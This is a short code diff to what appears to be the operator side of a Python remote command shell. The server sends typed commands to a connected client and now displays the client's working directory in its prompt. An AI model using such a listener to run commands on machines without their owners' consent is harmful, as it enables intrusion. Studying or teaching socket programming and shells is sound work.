@@ -14,12 +14,17 @@ conn, addr = s.accept() # accept the connection. returns a connection object and
 print("Connection received from " + addr[0])
 
 while True:
-    command = input("$ ")
+    # receive the directory the client is currently working in
+    currDirectory = conn.recv(4096).decode("UTF-8")
+
+    command = input(currDirectory + " $ ")
 
     if command == "exit": # if the given command is "exit" then close the connection and break out of the loop
         conn.send(command.encode("UTF-8")) # but first send it to the client so it closes connection too
         s.close()
         break
+    elif command == "":
+        continue
 
     # with the connection object, send the input command (encoded from UTF-8 to bytes)
     conn.send(command.encode("UTF-8"))
